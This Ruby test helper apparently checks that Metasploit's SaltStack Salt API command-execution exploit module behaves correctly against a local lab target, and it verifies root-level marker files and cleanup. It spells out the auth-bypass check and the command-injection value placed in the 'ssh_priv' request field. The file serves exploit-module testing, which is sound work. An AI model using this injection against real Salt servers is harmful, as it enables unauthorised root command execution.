# frozen_string_literal: true

require_relative '../rsync_creds/native'

# Native controls gate the unmodified REST API owner's checks and command path.
module SaltApiTarget
  include RsyncCredentialTarget

  OWNER = 'exploit/linux/http/saltstack_salt_api_cmd_exec'
  SOURCE = 'modules/exploits/linux/http/saltstack_salt_api_cmd_exec.rb'

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'salt-api-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['target']
  end

  def sa_observe(action, *)
    output, = rc_command(action, 'target', 'python', '/opt/module-target/observe.py', action, *)
    JSON.parse(output)
  end

  def sa_ready
    rc_resources('before')
    argv = ['python3', '-B', 'test/module_targets/salt_api/native_probe.py']
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), error
    @rc[:readiness] = JSON.parse(File.read(File.join(target_runtime.fetch('artifacts'), 'salt-api-native.json')))
    expect(@rc.fetch(:readiness)).to include('passed' => true, 'module_invoked' => false)
    expect(sa_observe('artifacts')).to eq('exists' => false)
    @rc[:before_owner] = sa_observe('snapshot')
    @rc[:observer] = rc_json("begin;load 'test/module_targets/salt_api/observe.rb';SaltApiObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    @rc[:calibrated] = true
    rc_save
  end

  def sa_events(call, method, event = 'call')
    call.fetch(:events).select { |row| row['method'] == method && row['event'] == event && File.realpath(row.fetch('source')) == File.realpath(SOURCE) }
  end

  def sa_call(label, options = {}, action: 'check', reuse: false)
    offset = rc_json('framework.instance_variable_get(:@salt_api_events).length')
    call = { label: label, options: options }
    @rc[:calls] << call
    run_target_module(OWNER, 'target', options, action: action, reuse_module: reuse, allow_errors: true, command_timeout: 90) do |output|
      call[:output] = output
      call[:selection] = rc_json('active_module.object_id')
      call[:events] = rc_json("framework.instance_variable_get(:@salt_api_events).drop(#{offset})")
      call[:actual_state] = sa_observe('snapshot')
      call[:keygen_artifacts] = sa_observe('artifacts')
      rc_save
    end
    expect(call.fetch(:actual_state)).to eq(@rc.fetch(:before_owner))
    expect(call.fetch(:output)).not_to include('Error while running command')
    call
  end

  def sa_checks
    calls = 2.times.map { |index| sa_call('check-' + index.to_s, reuse: index.positive?) }
    expect(calls.map { |call| call.fetch(:selection) }.uniq.length).to eq(1)
    calls.each do |call|
      expect(sa_events(call, 'check', 'return').map { |row| row.fetch('check') }).to eq([{ 'code' => 'vulnerable', 'reason' => 'Auth bypass successful.' }])
      expect(sa_events(call, 'exploit')).to eq([])
      requests = call.fetch(:events).filter_map { |row| row['request'] }
      expect(requests.length).to eq(1)
      expect(requests.first).to include('method' => 'POST', 'uri' => '/run', 'content_type' => 'application/json')
      body = JSON.parse(Base64.strict_decode64(requests.first.fetch('data_base64')))
      expect(body).to include('client' => 'ssh', 'tgt' => '*', 'ssh_priv' => '/dev/null < /dev/null & #')
    end
  end

  def sa_commands
    @rc.fetch(:readiness).fetch('controls').each_with_index do |entry, index|
      expect(sa_observe('proof', entry.fetch('path'))).to eq('exists' => false)
      options = { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => entry.fetch('command'), 'AutoCheck' => index.zero?, 'DisablePayloadHandler' => true, 'WfsDelay' => 0 }
      call = sa_call(entry.fetch('label'), options, action: 'run', reuse: index.positive?)
      proof = rc_poll(10) do
        actual = sa_observe('proof', entry.fetch('path'))
        actual if actual['exists']
      end
      call[:proof] = proof
      call[:marker_removed] = sa_observe('proof', entry.fetch('path'), 'remove')
      rc_save
      expect(proof).to eq('exists' => true, 'uid' => 0, 'base64' => entry.fetch('marker_base64'))
      expect(call.fetch(:marker_removed)).to eq('exists' => false)
      @rc[:command_selection] ||= call.fetch(:selection)
      expect(call.fetch(:selection)).to eq(@rc.fetch(:command_selection))
      expect(sa_events(call, 'exploit').length).to eq(1)
      expect(sa_events(call, 'execute_command').map { |row| row.fetch('command') }).to eq([entry.fetch('command')])
      expect(sa_events(call, 'execute_command').map { |row| row.fetch('payload') }).to eq([{ 'name' => 'cmd/unix/generic', 'command' => entry.fetch('command') }])
      checks = sa_events(call, 'check', 'return').map { |row| row.fetch('check') }
      expect(checks).to eq(index.zero? ? [{ 'code' => 'vulnerable', 'reason' => 'Auth bypass successful.' }] : [])
      requests = call.fetch(:events).filter_map { |row| row['request'] }
      bodies = requests.map { |request| JSON.parse(Base64.strict_decode64(request.fetch('data_base64'))) }
      expect(bodies.map { |body| body.fetch('ssh_priv') }).to eq((index.zero? ? ['/dev/null < /dev/null & #'] : []) + ["/dev/null < /dev/null & (#{entry.fetch('command')}) & #"])
      expect(call.fetch(:output)).not_to include('Exploit failed')
    end
  end

  def sa_refused_port
    socket = TCPServer.new('127.0.0.1', 0)
    port = socket.local_address.ip_port
    socket.close
    expect { TCPSocket.new('127.0.0.1', port) }.to raise_error(Errno::ECONNREFUSED)
    options = { 'RPORT' => port, 'HttpClientTimeout' => 2 }
    check = sa_call('refused-port-check', options)
    expect(sa_events(check, 'check', 'return').map { |row| row.fetch('check') }).to eq([{ 'code' => 'unknown', 'reason' => 'Target did not respond to check.' }])
    call = sa_call('refused-port-autocheck', options.merge('TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'false', 'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'AutoCheck' => true), action: 'run', reuse: true)
    expect(sa_events(call, 'exploit')).to eq([])
    expect(sa_events(call, 'execute_command')).to eq([])
    expect(call.fetch(:output)).to include('Exploit aborted due to failure')
  ensure
    socket&.close unless socket&.closed?
  end

  def sa_cleanup
    return unless @rc[:calibrated]

    @rc[:after_owner] = sa_observe('snapshot')
    @rc[:retained_keygen_artifacts] = sa_observe('artifacts')
    # The vendor creates literal path directories before ssh-keygen. Capture
    # these artifacts first; this separate fixture removal is not module cleanup.
    @rc[:fixture_artifacts_removed] = sa_observe('artifacts', 'remove')
    expect(sa_observe('artifacts')).to eq('exists' => false)
    expect(@rc.fetch(:after_owner)).to eq(@rc.fetch(:before_owner))
    rc_resources('after')
  ensure
    rc_save
  end
end
